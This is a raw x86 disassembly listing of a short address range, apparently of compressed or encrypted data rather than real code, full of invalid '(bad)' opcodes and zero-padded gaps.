  42a44b:	mov    dl,0xb7
  42a44d:	and    dl,0xb2
  42a450:	adc    ah,BYTE PTR [ecx+0x54]
  42a453:	push   DWORD PTR [edi-0xf]
  42a456:	xchg   ebp,eax
  42a457:	add    ecx,DWORD PTR [ebx]
  42a459:	xchg   edx,eax
  42a45a:	iret   
  42a45b:	(bad)  
  42a45c:	or     eax,0xb03037b6
  42a461:	std    
  42a462:	leave  
  42a463:	jecxz  0x42a4d0
  42a465:	sbb    ebx,0x2d40a6c8
  42a46b:	jecxz  0x42a3f5
  42a46d:	mov    es,WORD PTR [edi]
  42a46f:	jmp    0x23696873
  42a474:	adc    DWORD PTR [ecx],edi
  42a476:	add    al,0x1f
  42a478:	add    eax,DWORD PTR [ecx+0x6]
  42a47b:	(bad)  
  42a47c:	sbb    al,0xea
  42a47e:	xchg   BYTE PTR [edi+0x3a0f6216],bl
  42a484:	in     al,0xf6
  42a486:	mov    esp,0xc0ed7c8d
  42a48b:	adc    BYTE PTR [edi+0x27da8079],bl
  42a491:	push   cs
  42a492:	mov    eax,0x429e2790
  42a497:	mov    ds:0xe8c058d0,eax
  42a49c:	cwde   
  42a49d:	dec    ebx
  42a49e:	sub    DWORD PTR [ebp+0x2559c031],ebp
  42a4a4:	sbb    eax,0x66ce79c7
  42a4a9:	ins    BYTE PTR es:[edi],dx
  42a4aa:	dec    edi
  42a4ab:	sub    edx,esi
  42a4ad:	xor    edx,DWORD PTR [ebx]
  42a4af:	mov    ebx,0x438cf53
  42a4b4:	ds cmp al,0xc6
  42a4b7:	frstor [edi-0x77]
  42a4ba:	push   ecx
  42a4bb:	fdiv   DWORD PTR [esi+0x65]
  42a4be:	cdq    
  42a4bf:	cmp    edx,DWORD PTR [ebp+0x4]
  42a4c2:	cmc    
  42a4c3:	lods   al,BYTE PTR ds:[esi]
  42a4c4:	jno    0x42a532
  42a4c6:	ins    BYTE PTR es:[edi],dx
  42a4c7:	in     al,dx
  42a4c8:	shl    DWORD PTR [edi+ecx*2+0x6ae0c2b3],cl
  42a4cf:	bound  edx,QWORD PTR [eax+0x55dbac67]
  42a4d5:	(bad)  
  42a4d6:	pusha  
  42a4d7:	lods   al,BYTE PTR ds:[esi]
  42a4d8:	hlt    
  42a4d9:	sub    al,0x3d
  42a4db:	imul   ebp,DWORD PTR [eax-0x582839f0],0xc2249b2a
  42a4e5:	pop    esi
  42a4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4e7:	or     eax,0x78b588fe
  42a4ec:	inc    ebp
  42a4ed:	scas   al,BYTE PTR es:[edi]
  42a4ee:	aas    
  42a4ef:	aad    0xb5
  42a4f1:	and    al,0x0
  42a4f3:	cmc    
  42a4f4:	mov    al,0xac
  42a4f6:	mov    cl,0x76
  42a4f8:	push   ecx
  42a4f9:	fistp  WORD PTR [esi*1-0x18f6ac22]
  42a500:	out    dx,al
  42a501:	int3   
  42a502:	mov    eax,ds:0x66e2ed1a
  42a507:	cld    
  42a508:	cli    
  42a509:	idiv   DWORD PTR [eax+esi*2]
  42a50c:	sbb    eax,0xf839c128
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xb945219f
  42a583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0xaf000001
  42a58d:	jnp    0x42a52f
  42a58f:	dec    esp
  42a590:	adc    BYTE PTR [esi],dl
  42a592:	cld    
  42a593:	xor    ecx,DWORD PTR [esi]
  42a595:	ds pop ebp
  42a597:	or     BYTE PTR [ebp-0x44797da6],dl
  42a59d:	mov    ebx,0x139a1d98
  42a5a2:	mov    cl,0x58
  42a5a4:	data16 outs dx,BYTE PTR ds:[esi]
  42a5a6:	fisttp QWORD PTR [edx]
  42a5a8:	push   ebp
  42a5a9:	outs   dx,DWORD PTR ds:[esi]
  42a5aa:	ror    ebp,0x26
  42a5ad:	mov    ch,0xe1
  42a5af:	mov    ch,0x98
  42a5b1:	mov    bl,0xe
  42a5b3:	sub    eax,0xedd0c86a
  42a5b8:	jge    0x42a5ce
  42a5ba:	mov    ecx,0xd2203b33
  42a5bf:	sar    DWORD PTR [edx+0x11],1
  42a5c2:	sub    DWORD PTR [eax+0x0],edi
  42a5c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5c6:	out    0x98,eax
  42a5c8:	xchg   ebp,eax
  42a5c9:	adc    BYTE PTR [edx+0x5d],bl
  42a5cc:	fidivr WORD PTR [ecx-0x25ce075f]
  42a5d2:	mov    ds,ebp
  42a5d4:	sbb    DWORD PTR [esi-0x6e],0x9660fbdb
  42a5db:	aam    0xd0
  42a5dd:	(bad)  
  42a5de:	js     0x42a652
  42a5e0:	mov    al,0xc0
  42a5e2:	xchg   BYTE PTR [edx-0x4e],ch
  42a5e5:	aam    0x3
  42a5e7:	pop    ss
  42a5e8:	mov    esp,0x135207
  42a5ed:	scas   al,BYTE PTR es:[edi]
  42a5ee:	and    cl,dl
  42a5f0:	inc    edx
  42a5f1:	jecxz  0x42a58f
  42a5f3:	and    BYTE PTR [edi+ebp*4-0x12],0xe7
  42a5f8:	stos   DWORD PTR es:[edi],eax
  42a5f9:	push   ebp
  42a5fa:	pop    ebx
  42a5fb:	pop    ss
  42a5fc:	aas    
  42a5fd:	pop    es
  42a5fe:	pop    edx
  42a5ff:	jle    0x42a676
  42a601:	jmp    0x5bd2:0x8d9aceed
  42a608:	cmp    eax,0x73dcf8e
  42a60d:	adc    BYTE PTR [ebp-0x4f],dh
  42a610:	ret    
  42a611:	mov    bh,0x12
  42a613:	add    BYTE PTR [ecx-0x3a],bh
  42a616:	dec    ebp
  42a617:	push   edx
  42a618:	aam    0x7c
  42a61a:	mov    cl,0x10
  42a61c:	out    0x44,eax
  42a61e:	xchg   BYTE PTR [esp+edi*2],ah
  42a621:	mov    WORD PTR [eax+0x7d2764c8],gs
  42a627:	push   ebx
  42a628:	mov    BYTE PTR [edi+edx*1+0x44],ch
  42a62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a62d:	sbb    ebx,esp
  42a62f:	pop    esp
  42a630:	pop    esi
  42a631:	cmp    DWORD PTR [ecx+0xe743f7f],esi
  42a637:	jnp    0x42a616
  42a639:	xchg   BYTE PTR [edi+0x7a11b992],dh
  42a63f:	xchg   ebp,eax
  42a640:	mov    dl,0x17
  42a642:	cwde   
  42a643:	mov    ch,0x78
  42a645:	outs   dx,BYTE PTR ds:[esi]
  42a646:	add    eax,0x1ab5a915
  42a64b:	mov    BYTE PTR [ecx+0x4fa72393],bl
  42a651:	push   edx
  42a652:	dec    esp
  42a653:	call   0xe01ee2dc
  42a658:	inc    ebp
  42a659:	fcmovne st,st(7)
  42a65b:	mov    ds:0xc1d2a82f,al
  42a660:	ficom  DWORD PTR [eax-0x650d61b8]
  42a666:	cmc    
  42a667:	mov    ah,BYTE PTR [edx-0x5a1a4f2c]
  42a66d:	inc    ecx
  42a66e:	outs   dx,DWORD PTR ds:[esi]
  42a66f:	pop    ebx
  42a670:	add    DWORD PTR [ebp+0x77e55476],esi
  42a676:	push   esp
  42a677:	rcl    DWORD PTR [esi-0x2c],0xda
  42a67b:	push   es
  42a67c:	loop   0x42a6ed
  42a67e:	and    cl,dl
  42a680:	jmp    0x42a675
  42a682:	or     al,0x9c
  42a684:	(bad)  
  42a686:	out    0x6,eax
  42a688:	out    dx,al
  42a689:	inc    eax
  42a68a:	jns    0x42a6ad
  42a68c:	jbe    0x42a628
  42a68e:	stos   DWORD PTR es:[edi],eax
  42a68f:	jecxz  0x42a693
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1c47ece4],0x8c112cea
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x68000001
  42a70d:	lahf   
  42a70e:	sub    bh,bh
  42a710:	mov    eax,0x87551d1d
  42a715:	pop    ecx
  42a716:	in     eax,0x36
  42a718:	jnp    0x42a6b5
  42a71a:	aam    0x35
  42a71c:	nop
  42a71d:	add    BYTE PTR [ecx],cl
  42a71f:	retf   0x166e
  42a722:	es jg  0x42a73c
  42a725:	mov    edi,0x3d05db8e
  42a72a:	dec    ebp
  42a72b:	scas   al,BYTE PTR es:[edi]
  42a72c:	xor    al,0x6
  42a72e:	mov    dh,0x41
  42a730:	test   al,0x3
  42a732:	mov    esp,0xe37df20d
  42a737:	pop    esp
  42a738:	fcomip st,st(4)
  42a73a:	inc    eax
  42a73b:	adc    al,0x68
  42a73d:	jne    0x42a6d5
  42a73f:	test   BYTE PTR [ebp+0x3b],dl
  42a742:	retf   
  42a743:	imul   esp,DWORD PTR [edx+edx*8],0xffffffb4
  42a747:	retf   0xbb0e
  42a74a:	mov    bl,0xf5
  42a74c:	or     al,0x44
  42a74e:	jg     0x42a791
  42a750:	int    0x7d
  42a752:	xchg   ebp,eax
  42a753:	ror    DWORD PTR [edi],1
  42a755:	mov    dl,0x6c
  42a757:	add    ebp,esi
  42a759:	push   0xb3b658ca
  42a75e:	js     0x42a7d7
  42a760:	dec    esp
  42a761:	cmp    eax,0xe3193b22
  42a766:	inc    eax
  42a767:	cs mov dl,0x9a
  42a76a:	inc    ebx
  42a76b:	ds cdq 
  42a76d:	sbb    bh,BYTE PTR [edi+edi*4+0x32]
  42a771:	cmp    cl,cl
  42a773:	push   cs
  42a774:	mov    esi,0x83fd520e
  42a779:	stos   BYTE PTR es:[edi],al
  42a77a:	pop    ebp
  42a77b:	inc    eax
  42a77c:	ret    0x8949
  42a77f:	stos   DWORD PTR es:[edi],eax
  42a780:	xor    al,0x27
  42a782:	icebp  
  42a783:	sti    
  42a784:	xor    DWORD PTR [ecx+0x9],esi
  42a787:	mov    cl,0xd3
  42a789:	lock or eax,0x339b71b3
  42a78f:	dec    ecx
  42a790:	xor    BYTE PTR [ebx+esi*2-0x60500034],bh
  42a797:	shr    BYTE PTR [eax+0x15],cl
  42a79a:	cmc    
  42a79b:	push   edx
  42a79c:	(bad)  
  42a79d:	loop   0x42a768
  42a79f:	and    BYTE PTR [eax+esi*8+0x5d],dh
  42a7a3:	jle    0x42a7bf
  42a7a5:	xor    ah,BYTE PTR [esi+0x4dfe39a0]
  42a7ab:	lods   al,BYTE PTR ds:[esi]
  42a7ac:	cwde   
  42a7ad:	(bad)  
  42a7ae:	push   esi
  42a7af:	addr16 inc eax
  42a7b1:	xor    al,0x14
  42a7b3:	retf   0xd46b
  42a7b6:	mov    cl,0x1e
  42a7b8:	mov    bh,0xe1
  42a7ba:	stc    
  42a7bb:	xchg   ebp,eax
  42a7bc:	and    al,0x5d
  42a7be:	pop    ebp
  42a7bf:	push   0x5e9a4e24
  42a7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7c5:	adc    al,0x97
  42a7c7:	test   al,0x27
  42a7c9:	jge    0x42a7f6
  42a7cb:	in     al,0x5
  42a7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ce:	xlat   BYTE PTR ds:[ebx]
  42a7cf:	int    0x8a
  42a7d1:	scas   eax,DWORD PTR es:[edi]
  42a7d2:	fst    DWORD PTR [eax]
  42a7d4:	adc    al,0x64
  42a7d6:	lahf   
  42a7d7:	and    al,0x5f
  42a7d9:	mov    dl,0xe0
  42a7db:	imul   ebx,eax,0x16
  42a7de:	retf   
  42a7df:	push   0xffffff92
  42a7e1:	adc    DWORD PTR [edi-0x13],esp
  42a7e4:	dec    edi
  42a7e5:	mov    ds:0x502c735c,al
  42a7ea:	repz and al,0x0
  42a7ed:	hlt    
  42a7ee:	xchg   DWORD PTR [eax-0x76],ebp
  42a7f1:	es in  al,dx
  42a7f3:	pop    esi
  42a7f4:	jno    0x42a867
  42a7f6:	daa    
  42a7f7:	fnstcw WORD PTR [edx+0x48095dad]
  42a7fd:	jo     0x42a7b1
  42a7ff:	inc    ebp
  42a800:	add    BYTE PTR [ecx+ecx*2-0x37],dh
  42a804:	xchg   ebx,eax
  42a805:	fisttp DWORD PTR [ebx+esi*2+0x61a6766a]
  42a80c:	push   edi
  42a80d:	inc    ebx
  42a80e:	sti    
  42a80f:	out    dx,al
  42a810:	add    BYTE PTR fs:[eax],al
	...
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	test   eax,0x91c81baf
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    bh,al
  42a88d:	and    esi,DWORD PTR [ecx+ebp*4+0x42]
  42a891:	mov    eax,ds:0x66d2f349
  42a896:	ret    
  42a897:	repz mov ds:0x743ce6fa,eax
  42a89d:	jp     0x42a84e
  42a89f:	aaa    
  42a8a0:	sbb    BYTE PTR [edx-0x67d2e649],0x88
  42a8a7:	fdivr  st(5),st
  42a8a9:	push   ebx
  42a8aa:	mov    bl,0xb9
  42a8ac:	fcom   QWORD PTR [eax]
  42a8ae:	test   al,0x45
  42a8b0:	dec    esp
  42a8b1:	dec    ecx
  42a8b2:	hlt    
  42a8b3:	in     eax,dx
  42a8b4:	rcr    DWORD PTR [ecx+0x15753a44],0x6d
  42a8bb:	mov    ax,ds:0xa8c4827
  42a8c1:	mov    bl,0xa2
  42a8c3:	in     al,dx
  42a8c4:	lahf   
  42a8c5:	jle    0x42a85a
  42a8c7:	mov    dl,0x95
  42a8c9:	loopne 0x42a8e1
  42a8cb:	inc    edi
  42a8cc:	or     dh,ch
  42a8ce:	sub    al,0x51
  42a8d0:	pushf  
  42a8d1:	popa   
  42a8d2:	pop    esp
  42a8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8d4:	dec    ecx
  42a8d5:	or     edx,DWORD PTR [edx+0x7175cdf3]
  42a8db:	fnstenv [eax-0x51]
  42a8de:	mov    eax,ds:0xeeed6d2c
  42a8e3:	xchg   edx,eax
  42a8e4:	adc    al,0xbf
  42a8e6:	fcomp  QWORD PTR [ecx+0x5e]
  42a8e9:	jo     0x42a934
  42a8eb:	adc    edi,DWORD PTR [edx+edi*2]
  42a8ee:	mov    dl,0x1c
  42a8f0:	adc    BYTE PTR [esi],bh
  42a8f2:	shl    DWORD PTR [edx],1
  42a8f4:	pop    edx
  42a8f5:	bound  eax,QWORD PTR [edi]
  42a8f7:	jl     0x42a950
  42a8f9:	in     al,0x74
  42a8fb:	rcr    bl,0xf1
  42a8fe:	xor    al,0x39
  42a900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a901:	arpl   ax,ax
  42a903:	(bad)  
  42a904:	fbstp  TBYTE PTR [ecx-0x21]
  42a907:	mov    eax,ds:0xee5efeb4
  42a90c:	push   esp
  42a90d:	gs jg  0x42a8d1
  42a910:	fistp  QWORD PTR [ebx+0x6f]
  42a913:	jb     0x42a899
  42a915:	pop    ss
  42a916:	add    al,0xd8
  42a918:	push   es
  42a919:	jnp    0x42a95a
  42a91b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a91c:	inc    ebx
  42a91d:	adc    eax,DWORD PTR [edi-0x475f0eba]
  42a923:	mov    ecx,0x3264727c
  42a928:	test   BYTE PTR [eax+0x6d],al
  42a92b:	bound  ebx,QWORD PTR [eax+0x2b]
  42a92e:	fist   WORD PTR [eax-0x44]
  42a931:	cmp    eax,0x9aee5a53
  42a936:	setbe  BYTE PTR [edx]
  42a939:	(bad)  
  42a93a:	and    ebx,DWORD PTR [esp+eax*8+0x3b]
  42a93e:	aaa    
  42a93f:	clc    
  42a940:	or     BYTE PTR [ecx+0x523a7c63],dh
  42a946:	mov    ds:0x193864fc,al
  42a94b:	or     DWORD PTR [ecx+edi*8],eax
  42a94e:	fdivrp st(2),st
  42a950:	fwait
  42a951:	sbb    ch,BYTE PTR fs:[ebx-0x62]
  42a955:	sbb    cl,BYTE PTR [edx]
  42a957:	push   ecx
  42a958:	pop    ecx
  42a959:	adc    al,dl
  42a95b:	shl    BYTE PTR [ebp+0x22],0x52
  42a95f:	add    eax,0x8cb3a49
  42a964:	leave  
  42a965:	in     eax,0x18
  42a967:	out    0xf8,al
  42a969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a96a:	test   BYTE PTR [eax-0x609c0853],bl
  42a970:	cmp    eax,0xea3407ad
  42a975:	call   0x5153:0x15757746
  42a97c:	sbb    cl,0x7c
  42a97f:	lahf   
  42a980:	and    eax,0x30d10c8c
  42a985:	call   0x2091750f
  42a98a:	mov    dh,0x15
  42a98c:	mov    dh,0x4b
  42a98e:	or     BYTE PTR [ebp+eax*2+0x0],dl
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	ret    0x3820
  42aa03:	inc    ecx
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    ch,bl
  42aa0d:	mov    eax,0xa5a9bda7
  42aa12:	test   BYTE PTR [edx+0x433db306],al
  42aa18:	mov    gs,WORD PTR [esi+0x35]
  42aa1b:	inc    edi
  42aa1c:	xor    dl,BYTE PTR [ebx+0x5cb973ab]
  42aa22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa23:	in     eax,dx
  42aa24:	bound  ebx,QWORD PTR [eax]
  42aa26:	xchg   edx,eax
  42aa27:	sbb    al,0xea
  42aa29:	adc    DWORD PTR [esi-0x2198eb28],ecx
  42aa2f:	mov    es,esp
  42aa31:	jp     0x42aa01
  42aa33:	shl    BYTE PTR [eax],cl
  42aa35:	push   cs
  42aa36:	mov    BYTE PTR [esi],al
  42aa38:	jnp    0x42aa89
  42aa3a:	popa   
  42aa3b:	xchg   ecx,eax
  42aa3c:	jbe    0x42aa7d
  42aa3e:	fdiv   QWORD PTR [edx+edx*2+0x27]
  42aa42:	lds    ebx,FWORD PTR [ebx-0x40ebc732]
  42aa48:	jae    0x42aaa8
  42aa4a:	inc    ecx
  42aa4b:	inc    esp
  42aa4c:	jecxz  0x42a9cf
  42aa4e:	and    DWORD PTR [eax+0x5a],esp
  42aa51:	popf   
  42aa52:	mov    es,WORD PTR [esi]
  42aa54:	push   eax
  42aa55:	(bad)  
  42aa56:	mov    edi,esi
  42aa58:	xchg   BYTE PTR [esp+ebx*8],bh
  42aa5b:	xchg   DWORD PTR ds:0xa5acead4,esi
  42aa61:	xchg   ebp,eax
  42aa62:	rol    BYTE PTR [edx+ecx*1+0x626b9d59],0x81
  42aa6a:	mov    edi,DWORD PTR [eax+ebp*8+0x25]
  42aa6e:	or     eax,0x46adee5d
  42aa73:	out    dx,eax
  42aa74:	mov    WORD PTR [edx+0x79],cs
  42aa77:	sbb    bl,bh
  42aa79:	retf   
  42aa7a:	pop    edi
  42aa7b:	pop    ss
  42aa7c:	push   edi
  42aa7d:	inc    esi
  42aa7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa7f:	or     ebp,ebx
  42aa81:	test   DWORD PTR [esi-0x24],ecx
  42aa84:	aas    
  42aa85:	and    eax,0x96396c18
  42aa8a:	pop    es
  42aa8b:	sar    ch,cl
  42aa8d:	add    eax,0xf8918b31
  42aa92:	mov    ebx,0x309ef4f6
  42aa97:	mov    ch,0x71
  42aa99:	in     eax,dx
  42aa9a:	repnz ins DWORD PTR es:[edi],dx
  42aa9c:	inc    BYTE PTR ds:0x54e2f33d
  42aaa2:	lods   eax,DWORD PTR ds:[esi]
  42aaa3:	fistp  QWORD PTR [ebp-0x72]
  42aaa6:	in     eax,dx
  42aaa7:	retf   
  42aaa8:	lock in eax,0x8e
  42aaab:	aam    0x9b
  42aaad:	xor    eax,esp
  42aaaf:	ret    0xabe2
  42aab2:	dec    edx
  42aab3:	push   ds
  42aab4:	stos   BYTE PTR es:[edi],al
  42aab5:	(bad)  
  42aab6:	int3   
  42aab7:	push   esp
  42aab8:	jmp    0x42aa5c
  42aaba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aabb:	pop    edi
  42aabc:	popf   
  42aabd:	iret   
  42aabe:	sub    al,0xa2
  42aac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aac1:	push   esi
  42aac2:	repnz jmp 0xd9c9:0xbdca1a59
  42aaca:	mov    dl,0x19
  42aacc:	not    dl
  42aace:	cld    
  42aacf:	push   es
  42aad0:	or     edx,DWORD PTR [ecx]
  42aad2:	add    DWORD PTR [ebp-0x64f86157],ebp
  42aad8:	push   edx
  42aad9:	jmp    0x3f25:0xb78ed10b
  42aae0:	lods   al,BYTE PTR ds:[esi]
  42aae1:	or     edx,DWORD PTR [ebx+0x34]
  42aae4:	mov    eax,0xae8ece00
  42aae9:	push   cs
  42aaea:	ins    BYTE PTR es:[edi],dx
  42aaeb:	or     eax,esi
  42aaed:	add    BYTE PTR [eax],0x96
  42aaf0:	add    al,0xba
  42aaf2:	jmp    0xdd9176d9
  42aaf7:	pop    ecx
  42aaf8:	test   al,0x2b
  42aafa:	jbe    0x42aa98
  42aafc:	lahf   
  42aafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aafe:	mov    al,0x57
  42ab00:	or     DWORD PTR [edx-0x19],eax
  42ab03:	cwde   
  42ab04:	rol    DWORD PTR [ebx],1
  42ab06:	lods   eax,DWORD PTR ds:[esi]
  42ab07:	cli    
  42ab08:	sub    ebp,esi
  42ab0a:	dec    eax
  42ab0b:	mov    ebx,0x2d63d170
  42ab10:	inc    edi
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	retf   
  42ab81:	and    cl,BYTE PTR [esi]
  42ab83:	jg     0x42ab20
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0x9f000001
  42ab8d:	mov    DWORD PTR [ebx+eiz*4],0xa9e9cfd2
  42ab94:	data16 fsubp st(3),st
  42ab97:	xor    al,0x45
  42ab99:	std    
  42ab9a:	fild   DWORD PTR [edx-0x46]
  42ab9d:	test   DWORD PTR [ecx],ebp
  42ab9f:	loope  0x42ab55
  42aba1:	xchg   ebp,eax
  42aba2:	adc    dl,dh
  42aba4:	addr16 cdq 
  42aba6:	jp     0x42ab8f
  42aba8:	push   edx
  42aba9:	pop    ss
  42abaa:	push   0x2e
  42abac:	push   es
  42abad:	pop    edx
  42abae:	dec    esp
  42abaf:	jne    0x42abb5
  42abb1:	into   
  42abb2:	pusha  
  42abb3:	jns    0x42abdb
  42abb5:	dec    ebx
  42abb6:	xchg   dh,cl
  42abb8:	xchg   ebp,eax
  42abb9:	cmp    ch,0xfb
  42abbc:	out    0x24,al
  42abbe:	add    eax,0x75cff37f
  42abc3:	sub    dl,BYTE PTR [esi+0x5c42e4fd]
  42abc9:	jp     0x42ab65
  42abcb:	dec    edi
  42abcc:	leave  
  42abcd:	pop    ecx
  42abce:	out    0xff,eax
  42abd0:	cmp    eax,ecx
  42abd2:	shl    DWORD PTR [esp+ebx*1],cl
  42abd5:	in     eax,0xc7
  42abd7:	mov    ebp,0x91db6958
  42abdc:	rcl    DWORD PTR [edi],1
  42abde:	cmp    al,0xf1
  42abe0:	sbb    BYTE PTR [eax],0x19
  42abe3:	aas    
  42abe4:	enter  0x7274,0x3f
  42abe8:	lds    esp,FWORD PTR [ebx-0x4c]
  42abeb:	aaa    
  42abec:	jp     0x42abf2
  42abee:	jecxz  0x42abc2
  42abf0:	mov    ebx,0x8f028a63
  42abf5:	out    0xb8,eax
  42abf7:	les    ecx,FWORD PTR [eax+0x79ca50c5]
  42abfd:	es jmp 0x835aaebf
  42ac03:	mov    dh,BYTE PTR [esi]
  42ac05:	(bad)  
  42ac06:	cmp    DWORD PTR [ebx+0x65],esi
  42ac09:	adc    edi,DWORD PTR [ebx+0x1252338]
  42ac0f:	mov    eax,ds:0x6244edb1
  42ac14:	int3   
  42ac15:	cdq    
  42ac16:	xchg   ebx,eax
  42ac17:	in     eax,0xfc
  42ac19:	xor    al,0x69
  42ac1b:	scas   eax,DWORD PTR es:[edi]
  42ac1c:	mov    esi,0x30e42601
  42ac21:	(bad)
  42ac25:	mov    ds,WORD PTR [esi+0xe]
  42ac28:	rcr    BYTE PTR [eax+0x25c83b5d],1
  42ac2e:	clc    
  42ac2f:	push   esi
  42ac30:	call   DWORD PTR [edi-0x4b8cd290]
  42ac36:	push   eax
  42ac37:	pusha  
  42ac38:	dec    esp
  42ac39:	lahf   
  42ac3a:	repz dec esp
  42ac3c:	ins    BYTE PTR es:[edi],dx
  42ac3d:	pop    ss
  42ac3e:	xchg   ebp,eax
  42ac3f:	pop    ebp
  42ac40:	mov    ds:0xb16dd9eb,al
  42ac45:	sbb    al,0x82
  42ac47:	xchg   BYTE PTR [eax],bl
  42ac49:	jb     0x42ac31
  42ac4b:	fwait
  42ac4c:	push   cs
  42ac4d:	mov    WORD PTR [edi+0x607f3812],cs
  42ac53:	push   eax
  42ac54:	mov    ecx,0xcca5e041
  42ac59:	or     eax,0xf679a2be
  42ac5e:	sahf   
  42ac5f:	je     0x42ac16
  42ac61:	push   edx
  42ac62:	or     ch,BYTE PTR [edi+0x6b962826]
  42ac68:	pop    eax
  42ac69:	adc    ebx,edx
  42ac6b:	pop    es
  42ac6c:	push   edx
  42ac6d:	mov    ds:0x66a7ae14,al
  42ac72:	rcr    BYTE PTR [ebx],0xf1
  42ac75:	mov    bh,0xd2
  42ac77:	push   0xffffffd3
  42ac79:	push   edx
  42ac7a:	jbe    0x42acf0
  42ac7c:	push   ebx
  42ac7d:	cmp    DWORD PTR [edi],edi
  42ac7f:	(bad)  
  42ac81:	outs   dx,BYTE PTR ds:[esi]
  42ac82:	(bad)  
  42ac83:	cmp    BYTE PTR [edi],bl
  42ac85:	not    DWORD PTR [edi]
  42ac87:	mov    ah,0x97
  42ac89:	ficom  WORD PTR [edx-0x2c]
  42ac8c:	in     al,dx
  42ac8d:	add    al,0x6b
  42ac8f:	dec    ebp
  42ac90:	out    dx,al
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	cmc    
  42ad01:	cmp    eax,0xcaa0f013
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    eax,0xe2000001
  42ad0d:	out    dx,eax
  42ad0e:	clc    
  42ad0f:	mov    al,0x9b
  42ad11:	pop    edi
  42ad12:	or     BYTE PTR [ecx-0x55013c04],cl
  42ad18:	mov    WORD PTR [ebx-0x33],?
  42ad1b:	mov    WORD PTR [ebx],gs
  42ad1d:	push   eax
  42ad1e:	xor    bl,BYTE PTR [ebx]
  42ad20:	xchg   edx,eax
  42ad21:	mov    edi,0xa132a502
  42ad26:	call   0x831a:0x55774806
  42ad2d:	sub    BYTE PTR [ecx+ebx*4],al
  42ad30:	cmc    
  42ad31:	pop    eax
  42ad32:	in     eax,0xd4
  42ad34:	sub    al,0x2b
  42ad36:	push   eax
  42ad37:	das    
  42ad38:	daa    
  42ad39:	push   eax
  42ad3a:	test   DWORD PTR [esi+ebx*1+0x42],ecx
  42ad3e:	mov    al,BYTE PTR [edi-0x69c34f3e]
  42ad44:	bound  ebp,QWORD PTR [edi]
  42ad46:	and    edx,DWORD PTR [eax+0x62d8a0be]
  42ad4c:	scas   eax,DWORD PTR es:[edi]
  42ad4d:	aam    0x88
  42ad4f:	pop    edx
  42ad50:	xlat   BYTE PTR ds:[ebx]
  42ad51:	pop    ecx
  42ad52:	dec    ebx
  42ad53:	jns    0x42ad35
  42ad55:	mov    eax,ds:0x2ef12b02
  42ad5a:	xor    ah,al
  42ad5c:	fistp  WORD PTR [esi+0x6b44ebb1]
  42ad62:	dec    edi
  42ad63:	cs push ss
  42ad65:	shr    eax,1
  42ad67:	lods   al,BYTE PTR ds:[esi]
  42ad68:	sbb    cl,BYTE PTR [ecx-0x71]
  42ad6b:	fcmovnu st,st(0)
  42ad6d:	sbb    al,0xcf
  42ad6f:	pop    ecx
  42ad70:	out    0x71,ax
  42ad73:	sbb    dl,BYTE PTR [ecx+0x30971484]
  42ad79:	and    al,cl
  42ad7b:	js     0x42ad1b
  42ad7d:	(bad)  
  42ad7e:	arpl   WORD PTR [eax],bp
  42ad80:	or     DWORD PTR [edx-0x1f],esi
  42ad83:	(bad)  
  42ad84:	mov    edi,0x4a8230dd
  42ad89:	stos   DWORD PTR es:[edi],eax
  42ad8a:	push   edi
  42ad8b:	push   0xffffff94
  42ad8d:	jae    0x42ade4
  42ad8f:	stc    
  42ad90:	xchg   ebx,eax
  42ad91:	adc    eax,eax
  42ad93:	(bad)  
  42ad94:	ror    BYTE PTR [edi],1
